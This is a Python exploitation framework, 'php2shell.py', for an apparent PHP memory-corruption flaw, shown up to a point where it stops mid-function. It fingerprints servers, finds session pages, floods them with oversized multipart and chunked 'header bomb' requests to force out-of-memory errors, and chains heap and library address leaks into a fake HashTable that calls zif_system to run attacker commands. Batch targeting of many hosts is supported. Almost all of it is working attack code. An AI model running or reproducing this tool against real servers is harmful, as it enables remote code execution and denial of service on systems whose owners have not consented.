#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell.py - CVE-2026-109618 integrated automated detection and exploitation framework

Full pipeline in a single command:
    fingerprint -> automatic session sink discovery -> precondition check (post_max vs memory_limit)
    -> OOM landing-point classification (before/after callback) -> heap corruption verification (concurrently taint all workers) -> three-stage RCE

Usage:
    python3 php2shell.py http://target/index.php            # auto: detect + exploit if feasible
    python3 php2shell.py scan    -u http://target/          # detect only
    python3 php2shell.py scan    -u http://target/ --safe   # skip heap corruption verification (OOM probes are still sent)
    python3 php2shell.py exploit -u http://target/ -c 'id>/tmp/p1' --proof-file /tmp/p1
    python3 php2shell.py batch   -f targets.txt --workers 4 -o report.json

Exit codes:
     0  RCE succeeded
    10  RCE ready (detection passed, not exploited)
    20  affected only / OOM-DoS possible
    30  not affected or patched
    40  no usable session sink
    50  target unreachable
"""

import argparse
import json
import os
import re
import socket
import ssl
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, '..', 'poc_eness'))

try:
    import poc_109618 as P
except Exception:                                   # pragma: no cover
    P = None

try:
    import php2shell_rce as RCE
except Exception:                                   # pragma: no cover
    RCE = None


# ----------------------------------------------------------------------------
# Constants / classification
# ----------------------------------------------------------------------------
V_RCE = 'RCE_READY'
V_DOS = 'AFFECTED_DOS_ONLY'
V_SAFE = 'NOT_AFFECTED_OR_PATCHED'
V_NOSINK = 'NO_SESSION_SINK'
V_DOWN = 'UNREACHABLE'
V_LIKELY = 'LIKELY_RCE'
# Preconditions met (post_max>memory_limit, OOM possible, session sink present),
# but active UAF probing observed no corruption -- cannot claim "RCE possible". Patched versions land here.
V_PREMISES = 'PREMISES_ONLY_UNVERIFIED'

# ---- Fake struct (fake HashTable carrier) size and command capacity ----
# The command is written at htdata+0x98 and the struct is HT_SIZE bytes long, so capacity = HT_SIZE - 0x98 - 1
HT_SIZE = 167
HT_CMD_OFFSET = 0x98
CMD_CAPACITY = HT_SIZE - HT_CMD_OFFSET - 1   # = 14

EXIT = {V_RCE: 10, V_LIKELY: 10, V_PREMISES: 15, V_DOS: 20, V_SAFE: 30,
         V_NOSINK: 40, V_DOWN: 50}

USE_COLOR = sys.stdout.isatty() and os.environ.get('NO_COLOR') is None


def c(text, code):
    if not USE_COLOR:
        return str(text)
    return '\033[%sm%s\033[0m' % (code, text)


def ok(t):    return c(t, '32')
def warn(t):  return c(t, '33')
def bad(t):   return c(t, '31')
def info(t):  return c(t, '36')
def dim(t):   return c(t, '90')
def bold(t):  return c(t, '1')


def log(tag, msg):
    print('%s %s' % (c('[%s]' % tag, '36'), msg), flush=True)


# ----------------------------------------------------------------------------
# HTTP client (raw socket, chunked supported)
# ----------------------------------------------------------------------------
class Resp(object):
    __slots__ = ('status', 'headers', 'body', 'elapsed', 'error')

    def __init__(self, status=0, headers=None, body=b'', elapsed=0.0, error=None):
        self.status = status
        self.headers = headers or {}
        self.body = body
        self.elapsed = elapsed
        self.error = error

    def h(self, name):
        return self.headers.get(name.lower())

    @property
    def alive(self):
        return self.error is None and self.status > 0

    def text(self):
        try:
            return self.body.decode('utf-8', 'replace')
        except Exception:
            return ''


class Client(object):
    def __init__(self, host, port, tls=False, timeout=20.0, host_header=None):
        self.host = host
        self.port = port
        self.tls = tls
        self.timeout = timeout
        self.host_header = host_header or (host if port in (80, 443) else '%s:%d' % (host, port))

    def _connect(self):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(self.timeout)
        if self.tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        return s

    def request(self, method, path, headers=None, body=b'', chunked=False,
                max_body=1 << 20, close=True):
        t0 = time.time()
        hdrs = {
            'Host': self.host_header,
            'User-Agent': 'php2shell/1.0',
            'Accept': '*/*',
            'Connection': 'close' if close else 'keep-alive',
        }
        if headers:
            hdrs.update(headers)
        if chunked:
            hdrs['Transfer-Encoding'] = 'chunked'
        elif body:
            hdrs['Content-Length'] = str(len(body))

        head = [('%s %s HTTP/1.1' % (method, path)).encode()]
        for k, v in hdrs.items():
            head.append(('%s: %s' % (k, v)).encode())
        packet = b'\r\n'.join(head) + b'\r\n\r\n'

        sock = None
        try:
            sock = self._connect()
            sock.sendall(packet)
            if chunked:
                self._send_chunked(sock, body)
            elif body:
                sock.sendall(body)
            return self._read(sock, t0, max_body)
        except socket.timeout:
            return Resp(elapsed=time.time() - t0, error='timeout')
        except ConnectionResetError:
            return Resp(elapsed=time.time() - t0, error='reset')
        except (BrokenPipeError, ConnectionAbortedError) as e:
            return Resp(elapsed=time.time() - t0, error='aborted:%s' % e)
        except OSError as e:
            return Resp(elapsed=time.time() - t0, error='os:%s' % e)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    @staticmethod
    def _send_chunked(sock, payload, size=65536):
        for i in range(0, len(payload), size):
            piece = payload[i:i + size]
            sock.sendall(b'%x\r\n' % len(piece) + piece + b'\r\n')
        sock.sendall(b'0\r\n\r\n')

    def _read(self, sock, t0, max_body):
        buf = b''
        while b'\r\n\r\n' not in buf:
            try:
                piece = sock.recv(65536)
            except socket.timeout:
                return Resp(elapsed=time.time() - t0, error='timeout-head')
            if not piece:
                break
            buf += piece
            if len(buf) > 1 << 20:
                break
        if b'\r\n\r\n' not in buf:
            return Resp(elapsed=time.time() - t0, error='no-header')

        raw_head, rest = buf.split(b'\r\n\r\n', 1)
        lines = raw_head.split(b'\r\n')
        try:
            status = int(lines[0].split(b' ')[1])
        except Exception:
            status = 0
        headers = {}
        for line in lines[1:]:
            if b':' in line:
                k, v = line.split(b':', 1)
                headers[k.decode('latin1').strip().lower()] = v.decode('latin1').strip()

        body = b''
        try:
            if 'content-length' in headers:
                want = min(int(headers['content-length']), max_body)
                body = rest[:want]
                while len(body) < want:
                    piece = sock.recv(min(65536, want - len(body)))
                    if not piece:
                        break
                    body += piece
            elif headers.get('transfer-encoding', '').lower() == 'chunked':
                data = rest
                while True:
                    while b'\r\n' not in data:
                        piece = sock.recv(65536)
                        if not piece:
                            break
                        data += piece
                    if b'\r\n' not in data:
                        break
                    line, data = data.split(b'\r\n', 1)
                    try:
                        n = int(line.strip().split(b';')[0], 16)
                    except Exception:
                        break
                    if n == 0:
                        break
                    while len(data) < n + 2:
                        piece = sock.recv(65536)
                        if not piece:
                            break
                        data += piece
                    body += data[:n]
                    data = data[n + 2:]
                    if len(body) > max_body:
                        break
            else:
                body = rest
                while len(body) < max_body:
                    try:
                        piece = sock.recv(65536)
                    except socket.timeout:
                        break
                    if not piece:
                        break
                    body += piece
        except socket.timeout:
            pass
        return Resp(status, headers, body, time.time() - t0)


# ----------------------------------------------------------------------------
# Utility functions
# ----------------------------------------------------------------------------
def parse_url(url):
    if '://' not in url:
        url = 'http://' + url
    u = urlparse(url)
    tls = u.scheme == 'https'
    port = u.port or (443 if tls else 80)
    path = u.path or '/'
    if u.query:
        path += '?' + u.query
    return u.hostname, port, path, tls, url


def new_client(url, timeout=20.0):
    host, port, path, tls, _ = parse_url(url)
    return Client(host, port, tls, timeout), path


def rnd(n=8):
    import random
    return ''.join(random.choice('abcdef0123456789') for _ in range(n))


def build_multipart(boundary, fields=None, files=None, big_value=None, big_name='pad'):
    b = boundary.encode()
    out = b''
    for name, value in (fields or []):
        out += b'--' + b + b'\r\n'
        out += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % name).encode()
        out += value.encode() if isinstance(value, str) else value
        out += b'\r\n'
    if big_value is not None:
        out += b'--' + b + b'\r\n'
        out += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % big_name).encode()
        out += big_value
        out += b'\r\n'
    for name, filename, content in (files or []):
        out += b'--' + b + b'\r\n'
        out += ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                % (name, filename)).encode()
        out += b'Content-Type: application/octet-stream\r\n\r\n'
        out += content + b'\r\n'
    out += b'--' + b + b'--\r\n'
    return out


def header_bomb_body(boundary, n_lines, name='a', prefix='X'):
    """A huge number of header lines in a single part -> blow up the rfc1867 header buffer."""
    b = boundary.encode()
    out = b'--' + b + b'\r\n'
    out += ('Content-Disposition: form-data; name="%s"\r\n' % name).encode()
    line = ('%s: v\r\n' % prefix).encode()
    out += line * n_lines
    out += b'\r\nx\r\n'
    out += b'--' + b + b'--\r\n'
    return out


OOM_RE = re.compile(r'Allowed memory size of (\d+) bytes exhausted \(tried to allocate (\d+) bytes\)')
FATAL_HINTS = ('Allowed memory size', 'tried to allocate', 'Unknown on line',
               'Maximum execution time', 'multipart')


def parse_oom(text):
    m = OOM_RE.search(text)
    if m:
        return {'memory_limit': int(m.group(1)), 'tried': int(m.group(2))}
    if 'tried to allocate' in text:
        m2 = re.search(r'tried to allocate (\d+) bytes', text)
        if m2:
            return {'memory_limit': None, 'tried': int(m2.group(1))}
    return None


def looks_fatal(resp):
    if resp.status >= 500:
        return True
    t = resp.text()
    return any(h in t for h in FATAL_HINTS)


# ----------------------------------------------------------------------------
# Stage 1: fingerprint
# ----------------------------------------------------------------------------
def do_fingerprint(url, timeout=20.0):
    cli, path = new_client(url, timeout)
    r = cli.request('GET', path, max_body=262144)
    info = {
        'url': url,
        'status': r.status,
        'error': r.error,
        'server': r.h('server'),
        'x_powered_by': r.h('x-powered-by'),
        'set_cookie': r.h('set-cookie'),
        'php_version': None,
        'sink_candidate': False,
    }
    if not r.alive:
        return info, cli, path
    for src in (r.h('x-powered-by') or '', r.h('server') or '', r.text()[:4096]):
        m = re.search(r'PHP/(\d+\.\d+\.\d+)', src)
        if m:
            info['php_version'] = m.group(1)
            break
    if not info['php_version']:
        m = re.search(r'(\d+\.\d+\.\d+)', r.h('x-lab-version') or '')
        if m:
            info['php_version'] = m.group(1)
    sc = (r.h('set-cookie') or '').upper()
    info['sink_candidate'] = 'PHPSESSID' in sc or 'PHPSESSID' in r.text().upper()
    return info, cli, path


# ----------------------------------------------------------------------------
# Stage 2: automatic session sink discovery
# ----------------------------------------------------------------------------
COMMON_PATHS = ['/', '/index.php', '/index.html', '/login.php', '/admin.php',
                '/home.php', '/app.php', '/test.php', '/info.php', '/phpinfo.php']


def discover_sinks(url, cli, base_path, max_fetch=14, timeout=20.0):
    """Find scripts that really do return Set-Cookie: PHPSESSID (= sinks that call session_start)."""
    host, port, _, tls, _ = parse_url(url)
    candidates = [base_path]
    base_resp = cli.request('GET', base_path, max_body=262144)
    body = base_resp.text()

    if body:
        for m in re.finditer(r'''(?:href|action|src)\s*=\s*["']([^"'#]{1,200})["']''',
                             body, re.I):
            link = m.group(1).strip()
            if link.startswith(('javascript:', 'mailto:', 'data:')):
                continue
            full = urljoin(url, link)
            if parse_url(full)[0] != host:
                continue
            p = urlparse(full).path or '/'
            if p not in candidates:
                candidates.append(p)
            if len(candidates) > 40:
                break

    for p in COMMON_PATHS:
        if p not in candidates:
            candidates.append(p)

    sinks = []
    fetched = 0
    for p in candidates:
        if fetched >= max_fetch:
            break
        fetched += 1
        r = cli.request('GET', p, max_body=65536)
        if not r.alive:
            continue
        cookie = (r.h('set-cookie') or '').upper()
        if 'PHPSESSID' in cookie:
            rec = {'path': p, 'status': r.status, 'set_cookie': r.h('set-cookie')[:120]}
            sinks.append(rec)
            log('sink', '%s -> Set-Cookie PHPSESSID (status %d)' % (p, r.status))
        elif 'PHPSESSID' in r.text().upper():
            sinks.append({'path': p, 'status': r.status, 'set_cookie': '(body)'})
            log('sink', '%s -> PHPSESSID appears in body' % p)
    if not sinks and base_resp.alive:
        sinks.append({'path': base_path, 'status': base_resp.status,
                      'set_cookie': base_resp.h('set-cookie'),
                      'note': 'no Set-Cookie; fallback attempt'})
        log('sink', warn('no Set-Cookie page found, fallback attempt %s' % base_path))
    return sinks


# ----------------------------------------------------------------------------
# Stage 3: precondition check (can a large CL body cause OOM)
# ----------------------------------------------------------------------------
def probe_cl_body(cli, path, limit_mb=32, timeout=40.0):
    """Large body with Content-Length: OOM possible => post_max_size > memory_limit."""
    result = {'attempts': [], 'oom': None, 'post_max_blocked': False}
    sizes = [mb for mb in (2, 4, 8, 16, 32, 48, 64) if mb <= limit_mb]
    for mb in sizes:
        boundary = '----p2s' + rnd(12)
        fields = [('PHP_SESSION_UPLOAD_PROGRESS', 'p2s-%d-%s' % (mb, rnd(4)))]
        big = b'A' * (mb * 1024 * 1024)
        body = build_multipart(boundary, fields=fields, big_value=big)
        r = cli.request('POST', path, body=body,
                        headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                        max_body=65536)
        oom = parse_oom(r.text()) if r.alive else None
        rec = {'mb': mb, 'status': r.status, 'error': r.error,
               'len': len(body), 'oom': oom, 'elapsed': round(r.elapsed, 2)}
        result['attempts'].append(rec)
        if oom:
            result['oom'] = dict(oom, mb=mb)
            log('cl', '%2dMB -> %s  OOM tried=%s' % (mb, bad('500'), oom.get('tried')))
            break
        if r.alive and r.status < 500:
            log('cl', '%2dMB -> %d (%.2fs)' % (mb, r.status, r.elapsed))
        else:
            log('cl', '%2dMB -> %s' % (mb, r.status if r.alive else ('ERR:' + str(r.error))))
        time.sleep(0.25)
    return result


# ----------------------------------------------------------------------------
# Stage 4: OOM landing-point classification (chunked header bomb, bypasses post_max)
# ----------------------------------------------------------------------------
def probe_header_bomb(cli, path, steps=(100000, 200000, 400000, 800000, 1600000),
                      timeout=60.0):
    result = {'attempts': [], 'oom': None, 'oom_suspected': None,
              'threshold_lines': None}
    for n in steps:
        boundary = '----p2s' + rnd(12)
        body = header_bomb_body(boundary, n)
        r = cli.request('POST', path, body=body, chunked=True,
                        headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                        max_body=65536)
        oom = parse_oom(r.text()) if r.alive else None
        rec = {'lines': n, 'mb': round(len(body) / 1048576.0, 2),
               'status': r.status, 'error': r.error, 'oom': oom,
               'elapsed': round(r.elapsed, 2)}
        result['attempts'].append(rec)
        if oom:
            result['oom'] = dict(oom, lines=n, mb=rec['mb'])
            result['threshold_lines'] = n
            log('oom', '%d lines (%.2fMB) -> OOM tried=%s' % (n, rec['mb'], oom.get('tried')))
            break
        # With display_errors=Off an OOM only shows as a status-code jump, with no error text
        if r.alive and r.status >= 500:
            result['oom_suspected'] = {'status': r.status, 'lines': n, 'mb': rec['mb']}
            result['threshold_lines'] = n
            log('oom', '%d lines (%.2fMB) -> %s suspected OOM (no output, display_errors=Off)'
                % (n, rec['mb'], bad('500')))
            break
        log('oom', '%d lines (%.2fMB) -> %s (%.2fs)' % (
            n, rec['mb'], r.status if r.alive else ('ERR:' + str(r.error)), r.elapsed))
        time.sleep(0.3)
    return result


# ----------------------------------------------------------------------------
# Stage 5: concurrently taint all workers + dereference verification
# ----------------------------------------------------------------------------
def dirty_workers(url, sink_path, mode, n=8, timeout=60.0):
    """Trigger OOM concurrently, covering as many prefork workers as possible, then check for residual corruption."""
    host, port, path, tls, _ = parse_url(url)

    def trigger(i):
        cli = Client(host, port, tls, timeout)
        if mode == 'bomb':
            boundary = '----p2s' + rnd(12)
            body = header_bomb_body(boundary, 800000)
            return cli.request('POST', sink_path, body=body, chunked=True,
                               headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                               max_body=32768)
        boundary = '----p2s' + rnd(12)
        body = build_multipart(boundary,
                               fields=[('PHP_SESSION_UPLOAD_PROGRESS', 'd-%d' % i)],
                               big_value=b'A' * (16 * 1024 * 1024))
        return cli.request('POST', sink_path, body=body,
                           headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                           max_body=32768)

    hits = 0
    with ThreadPoolExecutor(max_workers=n) as pool:
        futs = [pool.submit(trigger, i) for i in range(n)]
        for f in as_completed(futs):
            try:
                r = f.result()
                if looks_fatal(r) or r.error:
                    hits += 1
            except Exception:
                pass
    log('dirty', '%d concurrent OOM triggers, %d abnormal responses' % (n, hits))

    time.sleep(0.6)
    checks = []
    for i in range(4):
        cli = Client(host, port, tls, timeout)
        r = cli.request('GET', sink_path, max_body=8192)
        checks.append({'status': r.status, 'error': r.error, 'elapsed': round(r.elapsed, 2)})
        if not r.alive or r.status >= 500:
            log('deref', bad('recheck #%d abnormal: %s' % (i + 1, r.error or r.status)))
        time.sleep(0.15)

    crashed = any((not ch['error'] and ch['status'] >= 500) for ch in checks) or \
              sum(1 for ch in checks if ch['error']) >= 2
    return {'oom_triggers': n, 'fatal_hits': hits, 'checks': checks, 'corrupted': crashed}


# ----------------------------------------------------------------------------
# Stage 6: three-stage RCE (reuses php2shell_rce)
# ----------------------------------------------------------------------------
def probe_leak(url, sink_path, rounds=6, timeout=60.0, stage1_n=None):
    """Stage-1 only: try to leak the heap base. Success = observable memory corruption (affected), failure = no dangling."""
    if RCE is None or P is None:
        return {'ok': False, 'reason': 'RCE module unavailable'}
    host, port, _, tls, _ = parse_url(url)
    # The RCE stage uses a raw socket (RCE._dial); the scheme/TLS state must be synced over, otherwise the handshake against https targets is misaligned
    RCE.set_tls(bool(tls), insecure=bool(getattr(P, 'DEFAULT_INSECURE', False)),
                server_hostname=host)
    path = sink_path or '/'
    ex = P.Exploit(P.Target(url, timeout=timeout, verbose=False), 'id',
                   zif_offset=RCE.ZIF_OFFSET, dtor_offset=RCE.DTOR_OFFSET,
                   htdata_offset=RCE.HTDATA_OFFSET, profile='bookworm', verbose=False)
    if stage1_n:
        ex.stage1_n = stage1_n
    for i in range(1, rounds + 1):
        try:
            base = RCE.leak_chunk_base(host, port, path, ex)
        except Exception as e:
            log('leak1', 'attempt %d/%d exception: %s' % (i, rounds, e))
            base = None
        if base:
            return {'ok': True, 'chunk_base': hex(base), 'rounds': i}
        log('leak1', 'Stage-1 attempt %d/%d missed' % (i, rounds))
        time.sleep(0.4)
    return {'ok': False, 'rounds': rounds}


def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
                stage2_t=None, zif=None, dtor=None, htdata=None,
                leak_retries=3, timeout=60.0, ht_size=None,
                proof_require=None, readback_require=None, host_header=None):
    if RCE is None or P is None:
        return {'ok': False, 'reason': 'php2shell_rce/poc_109618 unavailable'}

    host, port, _, tls, _ = parse_url(url)
    # The RCE stage uses a raw socket (RCE._dial); the scheme/TLS state must be synced over, otherwise the handshake against https targets is misaligned
    RCE.set_tls(bool(tls), insecure=bool(getattr(P, 'DEFAULT_INSECURE', False)),
                server_hostname=host)
    RCE.set_net(timeout=timeout, host_header=host_header)
    if host_header:
        P.DEFAULT_HOST_HEADER = host_header
    path = sink_path or '/'
    zif = zif if zif is not None else RCE.ZIF_OFFSET
    dtor = dtor if dtor is not None else RCE.DTOR_OFFSET
    htdata = htdata if htdata is not None else RCE.HTDATA_OFFSET

    ht_size = int(ht_size or HT_SIZE)
    cap = ht_size - HT_CMD_OFFSET - 1
    if len(cmd.encode()) > cap:
        return {'ok': False,
                'reason': 'cmd exceeds capacity of %d bytes (ht_size=%d): %d'
                          % (cap, ht_size, len(cmd.encode()))}

    ex = P.Exploit(P.Target(url, timeout=timeout, verbose=False), cmd,
                   zif_offset=zif, dtor_offset=dtor, htdata_offset=htdata,
                   profile='bookworm', verbose=False)
    ex.ht_size = ht_size
    if stage1_n:
        ex.stage1_n = stage1_n
    s2t = stage2_t or RCE.STAGE2_T

    chunk_base = None
    for attempt in range(1, leak_retries + 1):
        log('leak1', 'Stage-1 leaking chunk_base (attempt %d/%d)' % (attempt, leak_retries))
        try:
            chunk_base = RCE.leak_chunk_base(host, port, path, ex)
        except Exception as e:
            log('leak1', 'exception: %s' % e)
            chunk_base = None
        if chunk_base:
            break
        time.sleep(0.5)
    if not chunk_base:
        return {'ok': False, 'reason': 'Stage-1 leak failed (tune --stage1-n)'}
    log('leak1', ok('chunk_base = %s' % hex(chunk_base)))

    libphp_base = None
    for attempt in range(1, leak_retries + 1):
        log('leak2', 'Stage-2 leaking libphp_base (attempt %d/%d)' % (attempt, leak_retries))
        try:
            libphp_base = RCE.leak_libphp_base(host, port, path, ex, s2t)
        except Exception as e:
            log('leak2', 'exception: %s' % e)
            libphp_base = None
        if libphp_base:
            break
        time.sleep(0.5)
    if not libphp_base:
        return {'ok': False, 'reason': 'Stage-2 leak failed (tune --stage2-t)',
                'chunk_base': hex(chunk_base)}
    log('leak2', ok('libphp_base = %s' % hex(libphp_base)))

    log('rce', 'Stage-3 fake HashTable -> zif_system, command: %s' % cmd)
    try:
        good = RCE.do_rce(host, port, path, ex, chunk_base, libphp_base, cmd,
                          htdata, zif, proof_file, rounds,
                          proof_require=proof_require)
    except Exception as e:
        log('rce', 'exception: %s' % e)
        good = False

    # --- Readback verification (fixes false negatives): the engine's "deref B=0B/no output" does not mean the command did not run.
    # Whenever the command carries a `>name` redirect, decide by HTTP readback of name (200 and not a 404 page).
    # Note: this only holds for "relative paths"; absolute paths like `>/out/p1` are not under the webroot, so readback 404s for sure.
    readback = None
    m_rb = re.search(r'>\s*([A-Za-z0-9_.\-]{1,32})\s*$', cmd)
    if not good and m_rb:
        import urllib.request as _u
        rb_url = url.rstrip('/') + '/' + m_rb.group(1)
        try:
            with _u.urlopen(rb_url, timeout=10) as r:
                body = r.read()
                code = r.getcode()
            # Soft 404: an in-site 200 fallback page must not count as a hit
            base_body = b''
            try:
                probe = url.rstrip('/') + '/p2s-nx-%d' % (int(time.time() * 1000) % 10 ** 8)
                with _u.urlopen(probe, timeout=10) as r0:
                    if r0.getcode() == 200:
                        base_body = r0.read()
            except Exception:
                pass
            soft404 = bool(base_body and body.strip() == base_body.strip())
            need = re.compile(readback_require.encode()) if readback_require else None
            if (code == 200 and body and b'Not Found' not in body
                    and not soft404 and (need is None or need.search(body))):
                good = True
                readback = body.decode('utf-8', 'replace')
                log('rce', ok('readback of %s succeeded (%dB)' % (m_rb.group(1), len(body))))
        except Exception:
            pass

    proof = readback
    if good and proof is None and proof_file:
        # Only read the file if do_rce already confirmed it was newly written this run (ProofWatch)
        try:
            with open(proof_file, 'rb') as fh:
                proof = fh.read().decode('utf-8', 'replace')
        except Exception:
            proof = '(read failed)'
    return {'ok': bool(good), 'chunk_base': hex(chunk_base),
            'libphp_base': hex(libphp_base), 'proof': proof}


# ----------------------------------------------------------------------------
# Orchestration: main detection flow
# ----------------------------------------------------------------------------
def scan_target(url, args):
    rpt = {'url': url, 'ts': time.strftime('%Y-%m-%dT%H:%M:%S'), 'steps': {}}
    if getattr(args, 'safe', False):
        log('safe', warn('--safe only skips heap corruption verification; OOM probes (up to a %sMB body) are still sent'
                         ' -> in production please use p2s_ext.py recon instead' % getattr(args, 'max_mb', '?')))
    log('1/6', 'fingerprint %s' % bold(url))
    info, cli, path = do_fingerprint(url, args.timeout)
    rpt['steps']['fingerprint'] = info
    if not info['status']:
        rpt['verdict'] = V_DOWN
        log('1/6', bad('target unreachable: %s' % info['error']))
        return rpt
    log('1/6', 'status=%s server=%s php=%s cookie=%s' % (
        info['status'], info['server'], info['php_version'] or '?',
        'yes' if info['set_cookie'] else 'no'))

    log('2/6', 'discovering session sinks (scripts that call session_start)')
    sinks = discover_sinks(url, cli, path, timeout=args.timeout)
    rpt['steps']['sinks'] = sinks
    if not sinks:
        rpt['verdict'] = V_NOSINK
        log('2/6', bad('no session sink found -> this CVE has no exploitation surface'))
        return rpt
    sink = sinks[0]['path']
    log('2/6', ok('selected sink: %s' % sink))

    log('3/6', 'precondition check: can a large body with Content-Length cause OOM (post_max vs memory_limit)')
    cl = probe_cl_body(cli, sink, limit_mb=args.max_mb, timeout=args.timeout * 2)
    rpt['steps']['cl_probe'] = cl
    if cl['oom']:
        log('3/6', ok('confirmed post_max_size > memory_limit (%sMB body triggered OOM)' % cl['oom']['mb']))
        rpt['verdict'] = V_PREMISES
        rpt['precondition'] = 'post_max_size > memory_limit'
        if cl['oom'].get('memory_limit'):
            rpt['memory_limit'] = cl['oom']['memory_limit']
    else:
        log('3/6', warn('CL path could not OOM -> likely post_max_size <= memory_limit'))

    log('4/6', 'OOM landing-point classification: chunked header bomb without CL (bypasses post_max)')
    bomb = probe_header_bomb(cli, sink, timeout=args.timeout * 3)
    rpt['steps']['header_bomb'] = bomb

    bomb_hit = bomb['oom'] or bomb.get('oom_suspected')

    if not cl['oom'] and not bomb_hit:
        rpt['verdict'] = V_SAFE
        log('4/6', warn('neither path can OOM -> not affected / patched / ample memory'))
        return rpt

    if not cl['oom'] and bomb_hit:
        tried = (bomb['oom'] or {}).get('tried')
        rpt['oom_landing'] = tried
        rpt['verdict'] = V_DOS
        if tried and tried < 65536:
            rpt['landing_stage'] = 'before_session_callback (header buffer)'
            log('4/6', warn('landing point tried=%d (header buffer growth, before the callback) -> no dangling' % tried))
        elif tried is None:
            rpt['landing_stage'] = 'unknown (no error echo)'
            log('4/6', warn('OOM with no output, landing point unknown -> leave it to heap corruption verification'))
        else:
            log('4/6', warn('landing point tried=%s' % tried))

    if getattr(args, 'try_leak', False) and cl['oom']:
        log('4.5/6', 'leak probe: Stage-1 leaks the heap base (distinguishes "affected" from "patched")')
        lk = probe_leak(url, sink, rounds=getattr(args, 'leak_rounds', 6),
                        timeout=args.timeout, stage1_n=getattr(args, 'stage1_n', None))
        rpt['steps']['leak_probe'] = lk
        if lk.get('ok'):
            rpt['verdict'] = V_RCE
            rpt['chunk_base'] = lk['chunk_base']
            log('4.5/6', ok('leak succeeded chunk_base=%s (round %d) -> memory corruption observable'
                            % (lk['chunk_base'], lk['rounds'])))
            log('6/6', 'conclusion')
            return rpt
        log('4.5/6', warn('leak failed -> preconditions met but no infoleak observed (possibly patched or a different layout)'))

    if args.safe:
        rpt.setdefault('verdict', V_DOS)
        rpt['note'] = '--safe skipped heap corruption verification'
        return rpt

    log('5/6', 'heap corruption verification: recheck after concurrently tainting all workers')
    mode = 'cl' if cl['oom'] else 'bomb'
    dirty = dirty_workers(url, sink, mode, n=args.workers_dirty, timeout=args.timeout * 2)
    rpt['steps']['dirty'] = dirty
    if dirty['corrupted']:
        rpt['verdict'] = V_RCE
        log('5/6', ok('recheck abnormal -> worker state corrupted, RCE primitive holds'))
    else:
        if cl['oom']:
            rounds = int(getattr(args, 'active_rounds', 2) or 2)
            if not getattr(args, 'no_active_uaf', False):
                log('5.5/6', 'active UAF test: same keep-alive connection A(taint)->B(dereference) x%d' % rounds)
                ap = active_crash_probe(url, timeout=max(args.timeout * 2, 45.0), rounds=rounds)
                rpt['steps']['active_uaf'] = ap
                av = ap.get('verdict')
                if av == 'worker_killed' or int(ap.get('crashes') or 0) > 0:
                    rpt['verdict'] = V_LIKELY
                    log('5.5/6', ok('active: crashes %s/%s -> UAF primitive verified (can proceed to exploit)'
                                    % (ap.get('crashes'), ap.get('rounds', rounds))))
                elif av in ('unavailable', 'error'):
                    rpt['verdict'] = V_PREMISES
                    log('5.5/6', warn('active: probe unavailable (%s) -> not drawing an RCE conclusion'
                                      % (ap.get('error') or av)))
                else:
                    rpt['verdict'] = V_PREMISES
                    log('5.5/6', warn('active: %s -> no corruption observed, judged "preconditions met, unverified"'
                                      % av))
            else:
                rpt['verdict'] = V_PREMISES
                log('5.5/6', warn('active UAF test skipped (--no-active-uaf) -> not drawing an RCE conclusion'))
        else:
            rpt['verdict'] = V_DOS
            log('5/6', warn('recheck normal -> landing point is before the callback, DoS only'))

    log('6/6', 'conclusion')
    return rpt


REDIR_RE = re.compile(r'>\s*([^\s;|&]+)')


def collect_cmds(args):
    """Collect the command list from -c (repeatable) and --cmd-file."""
    cmds = list(getattr(args, 'cmd', None) or [])
    cf = getattr(args, 'cmd_file', None)
    if cf:
        try:
            with open(cf, encoding='utf-8') as f:
                for line in f:
                    s = line.strip()
                    if s and not s.startswith('#'):
                        cmds.append(s)
        except OSError as e:
            return None, 'failed to read --cmd-file: %s' % e
    if not cmds:
        cmds = ['id>/tmp/p1']
    return cmds, None


def cmd_capacity(args):
    return int(getattr(args, 'ht_size', HT_SIZE) or HT_SIZE) - HT_CMD_OFFSET - 1


def proof_path_for(cmd, args, single):
    """Derive the local proof path from the redirect target in the command."""
    if single and getattr(args, 'proof_file', None):
        return args.proof_file
    pd = getattr(args, 'proof_dir', None)
    if not pd:
        return None
    m = REDIR_RE.search(cmd)
    if not m:
        return None
    return os.path.join(pd, os.path.basename(m.group(1)))


def parse_headers(items):
    """Parse ['K: V', ...] into a dict."""
    out = {}
    for it in items or []:
        if ':' not in it:
            continue
        k, v = it.split(':', 1)
        out[k.strip()] = v.strip()
    return out


def apply_net_options(args):
    """Inject --proxy / -H into the request layer (used by every request)."""
    if P is None:
        return
    P.DEFAULT_PROXY = getattr(args, 'proxy', None)
    P.DEFAULT_HEADERS = parse_headers(getattr(args, 'header', None))
    if hasattr(P, 'DEFAULT_INSECURE'):
        P.DEFAULT_INSECURE = (bool(getattr(args, 'insecure', False))
                              or os.environ.get("PHP2SHELL_INSECURE", "") == "1")
    if hasattr(P, 'DEFAULT_SOURCES'):
        P.DEFAULT_SOURCES = list(getattr(args, 'source_addr', None) or [])


def exploit_target(url, sink_path, args):
    """Run exploitation; -c is repeatable and each command runs the full three-stage chain once (each <= capacity)."""
    apply_net_options(args)
    cmds, err = collect_cmds(args)
    if err:
        return {'ok': False, 'reason': err}
    cap = cmd_capacity(args)
    single = len(cmds) == 1
    if not single:
        print(info('[multi] %d commands in total, executed one by one (each <= %d bytes)' % (len(cmds), cap)))

    results = []
    for i, c in enumerate(cmds, 1):
        if len(c.encode()) > cap:
            print(bad('  [%d/%d] skipped (%d > %d bytes): %s'
                      % (i, len(cmds), len(c.encode()), cap, c)))
            results.append({'cmd': c, 'ok': False, 'reason': 'over capacity'})
            continue
        pf = proof_path_for(c, args, single)
        if not single:
